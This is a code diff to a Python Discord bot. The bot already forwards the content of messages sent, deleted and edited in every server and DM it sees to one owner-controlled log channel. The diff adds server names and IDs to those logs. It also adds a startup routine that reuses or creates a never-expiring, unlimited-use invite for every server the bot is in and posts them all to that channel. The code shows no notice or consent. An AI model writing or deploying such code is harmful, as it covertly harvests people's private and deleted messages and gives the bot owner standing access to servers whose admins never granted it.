@@ -158,9 +158,11 @@ async def on_message(message):
     if not message.author.bot:
         log_channel = bot.get_channel(LOG_CHANNEL_ID)
         if log_channel:
+            server_info = f"Server: {message.guild.name} (`{message.guild.id}`)" if message.guild else "Server: DM"
             await log_channel.send(
                 f"💬 **Message Sent**\n"
                 f"User: {message.author} (`{message.author.id}`)\n"
+                f"{server_info}\n"
                 f"Channel: {message.channel}\n"
                 f"Content: {message.content}"
             )
@@ -176,9 +178,11 @@ async def on_message_delete(message):
     if not message.author.bot:
         log_channel = bot.get_channel(LOG_CHANNEL_ID)
         if log_channel:
+            server_info = f"Server: {message.guild.name} (`{message.guild.id}`)" if message.guild else "Server: DM"
             await log_channel.send(
                 f"🗑️ **Message Deleted**\n"
                 f"User: {message.author} (`{message.author.id}`)\n"
+                f"{server_info}\n"
                 f"Channel: {message.channel}\n"
                 f"Deleted Content: {message.content}"
             )
@@ -192,9 +196,11 @@ async def on_message_edit(before, after):
     if not before.author.bot and before.content != after.content:
         log_channel = bot.get_channel(LOG_CHANNEL_ID)
         if log_channel:
+            server_info = f"Server: {before.guild.name} (`{before.guild.id}`)" if before.guild else "Server: DM"
             await log_channel.send(
                 f"✏️ **Message Edited**\n"
                 f"User: {before.author} (`{before.author.id}`)\n"
+                f"{server_info}\n"
                 f"Channel: {before.channel}\n"
                 f"Before: {before.content}\n"
                 f"After: {after.content}"
@@ -208,6 +214,55 @@ async def on_ready():
     """
     await bot.tree.sync()
     print(f"Bot is now running as: {bot.user}")
+    
+    # Log all servers the bot is in to the logging channel
+    log_channel = bot.get_channel(LOG_CHANNEL_ID)
+    if log_channel:
+        guild_entries = []
+        for guild in bot.guilds:
+            # Try to get or create an invite for each server
+            invite_link = "Unable to create invite"
+            try:
+                # First, check if there are existing invites
+                existing_invites = await guild.invites()
+                valid_invite = None
+                
+                # Look for a permanent invite (max_age=0) or any valid invite
+                for invite in existing_invites:
+                    if invite.max_age == 0 or invite.max_age is None:
+                        valid_invite = invite
+                        break
+                
+                # If no permanent invite found, use the first valid one
+                if not valid_invite and existing_invites:
+                    valid_invite = existing_invites[0]
+                
+                if valid_invite:
+                    invite_link = valid_invite.url
+                else:
+                    # No existing invite found, create a new one
+                    text_channel = None
+                    for channel in guild.text_channels:
+                        if channel.permissions_for(guild.me).create_instant_invite:
+                            text_channel = channel
+                            break
+                    
+                    if text_channel:
+                        # Create an invite that never expires
+                        invite = await text_channel.create_invite(max_age=0, max_uses=0)
+                        invite_link = invite.url
+            except Exception as e:
+                invite_link = f"Error: {str(e)}"
+            
+            guild_entries.append(f"- {guild.name} (`{guild.id}`) - {invite_link}")
+        
+        guild_list = "\n".join(guild_entries)
+        server_count = len(bot.guilds)
+        await log_channel.send(
+            f"✅ **Bot Started**\n"
+            f"Bot: {bot.user} (`{bot.user.id}`)\n"
+            f"Servers ({server_count}):\n{guild_list}"
+        )
 
 
 bot.run(TOKEN)
